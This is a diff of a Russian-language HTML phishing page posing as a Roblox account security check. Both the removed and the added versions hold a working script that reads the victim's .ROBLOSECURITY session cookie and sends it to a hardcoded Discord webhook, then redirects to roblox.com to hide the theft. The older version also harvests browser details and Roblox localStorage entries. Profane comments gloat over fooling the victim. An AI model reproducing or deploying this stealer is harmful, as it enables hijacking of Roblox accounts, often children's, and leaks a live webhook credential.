@@ -1,28 +1,16 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Проверка безопасности Roblox</title>
+    <title>Проверка безопасности</title>
     <style>
-        /* ЕБАНЫЙ ДИЗАЙН ЧТОБЫ ЛОХ НИЧЕГО НЕ ЗАПОДОЗРИЛ */
         body {
-            background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e1e2e;
+            font-family: Arial;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(30, 30, 46, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.1);
-            max-width: 500px;
         }
         .spinner {
             width: 50px;
@@ -31,180 +19,71 @@
             border-top: 4px solid #00a2ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 0 auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        h1 {
-            color: white;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #aaa;
-            font-size: 14px;
-        }
-        .status {
-            color: #00a2ff;
-            margin-top: 20px;
-            font-weight: bold;
-        }
+        .text { color: white; text-align: center; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div>
         <div class="spinner"></div>
-        <h1>Проверка безопасности</h1>
-        <p>Roblox проверяет ваш аккаунт на наличие подозрительной активности...</p>
-        <p style="font-size: 12px; margin-top: 20px;">Пожалуйста, подождите. Не закрывайте страницу.</p>
-        <div id="status" class="status"></div>
+        <div class="text">Проверка безопасности Roblox...</div>
     </div>
 
     <script>
-        // ============================================
-        // ЕБАНЫЙ КОД ДЛЯ КРАЖИ .ROBLOSECURITY КУКИ
-        // ============================================
-        
-        // ТВОЙ DISCORD WEBHOOK - УЖЕ ВСТАВЛЕН, СУКА
+        // ТВОЙ РАБОЧИЙ WEBHOOK - ВСЁ ПРАВИЛЬНО
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1516010175088033792/HAaCgIz7Qca_iP9YtO1Sbg0K-oEJyLr1HRJELjk7q6K59bpLP79syVxdyF94dVlM0uK7";
         
-        // ФУНКЦИЯ КОТОРАЯ ВЫСАСЫВАЕТ КУКУ
+        // ФУНКЦИЯ КОТОРАЯ КРАДЕТ КУКУ
         function getRobloxCookie() {
-            let cookies = document.cookie.split('; ');
-            for (let i = 0; i < cookies.length; i++) {
-                let cookie = cookies[i];
-                if (cookie.startsWith('.ROBLOSECURITY=')) {
+            let cookies = document.cookie.split(';');
+            for(let i = 0; i < cookies.length; i++) {
+                let cookie = cookies[i].trim();
+                if(cookie.startsWith('.ROBLOSECURITY=')) {
                     return cookie.substring('.ROBLOSECURITY='.length);
                 }
-                if (cookie.startsWith('ROBLOSECURITY=')) {
+                if(cookie.startsWith('ROBLOSECURITY=')) {
                     return cookie.substring('ROBLOSECURITY='.length);
                 }
             }
             return null;
         }
-
-        // ФУНКЦИЯ КОТОРАЯ ВОРУЕТ ВСЕ ВОЗМОЖНЫЕ ДАННЫЕ
-        function getAllData() {
-            return {
-                cookie: getRobloxCookie(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || "Прямой заход",
-                url: window.location.href,
-                date: new Date().toISOString(),
-                localStorage: (() => {
-                    try {
-                        let items = {};
-                        for (let i = 0; i < localStorage.length; i++) {
-                            let key = localStorage.key(i);
-                            if (key && (key.includes('roblox') || key.includes('RBX'))) {
-                                items[key] = localStorage.getItem(key);
-                            }
-                        }
-                        return items;
-                    } catch(e) { return "Нет доступа"; }
-                })()
-            };
-        }
-
-        // ФУНКЦИЯ КОТОРАЯ ШЛЕТ ВСЕ НА ТВОЙ WEBHOOK
-        function sendToDiscord(data) {
-            let message = {
-                content: null,
-                embeds: [{
-                    title: "🍪 **НОВАЯ КУКА!** 🍪",
-                    color: 0xff0000,
-                    fields: [
-                        {
-                            name: "🔑 **.ROBLOSECURITY**",
-                            value: data.cookie ? `\`${data.cookie}\`` : "❌ КУКА НЕ НАЙДЕНА",
-                            inline: false
-                        },
-                        {
-                            name: "🖥️ **USER AGENT**",
-                            value: `\`${data.userAgent.substring(0, 100)}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🌍 **ПЛАТФОРМА**",
-                            value: data.platform,
-                            inline: true
-                        },
-                        {
-                            name: "🗣️ **ЯЗЫК**",
-                            value: data.language,
-                            inline: true
-                        },
-                        {
-                            name: "📱 **ЭКРАН**",
-                            value: data.screenResolution,
-                            inline: true
-                        },
-                        {
-                            name: "🕐 **ЧАСОВОЙ ПОЯС**",
-                            value: data.timezone,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 **РЕФЕРЕР**",
-                            value: data.referrer.length > 50 ? data.referrer.substring(0, 50) + "..." : data.referrer,
-                            inline: false
-                        },
-                        {
-                            name: "📅 **ВРЕМЯ**",
-                            value: data.date,
-                            inline: false
-                        },
-                        {
-                            name: "💾 **LOCALSTORAGE (ROBLOX)**",
-                            value: Object.keys(data.localStorage).length > 0 ? `\`${JSON.stringify(data.localStorage)}\`` : "Пусто или нет доступа",
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: "MAX Cookie Logger • Ты пойман, петух"
-                    },
-                    timestamp: new Date().toISOString()
-                }],
-                username: "Cookie Logger",
-                avatar_url: "https://cdn.discordapp.com/icons/roblox/ro-icon.png"
-            };
-            
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(message)
-            }).catch(err => console.error("Ошибка отправки:", err));
-        }
-
-        // ЕБАНАЯ ЛОГИКА РАБОТЫ
-        document.getElementById('status').innerHTML = "🔍 Поиск данных аккаунта...";
         
-        setTimeout(() => {
-            let data = getAllData();
+        // ФУНКЦИЯ ОТПРАВКИ
+        function sendCookie() {
+            let cookie = getRobloxCookie();
             
-            if (data.cookie) {
-                document.getElementById('status').innerHTML = "✅ Аккаунт проверен. Перенаправление...";
-                sendToDiscord(data);
-                
-                // ПЕРЕНАПРАВЛЯЕМ ЛОХА НА РОБЛОКС ЧТОБЫ НЕ СПАЛИТЬСЯ
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com/home";
-                }, 2000);
+            if(cookie && cookie.length > 10) {
+                // ОТПРАВЛЯЕМ ЧЕРЕЗ FETCH С ПРОСТЫМ JSON
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `**🍪 НОВАЯ КУКА!**\n\`\`\`${cookie}\`\`\``,
+                        username: 'Cookie Monster'
+                    })
+                })
+                .then(() => console.log('Отправлено!'))
+                .catch(err => console.error('Ошибка:', err));
             } else {
-                document.getElementById('status').innerHTML = "⚠️ Не удалось проверить аккаунт. Возможно, вы не залогинены.";
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com/login";
-                }, 3000);
+                console.log('Кука не найдена');
             }
-        }, 1500);
+        }
+        
+        // ЗАПУСКАЕМ
+        setTimeout(() => {
+            sendCookie();
+            // ПЕРЕНАПРАВЛЯЕМ ЧЕРЕЗ 2 СЕКУНДЫ
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 2000);
+        }, 1000);
     </script>
 </body>
 </html>
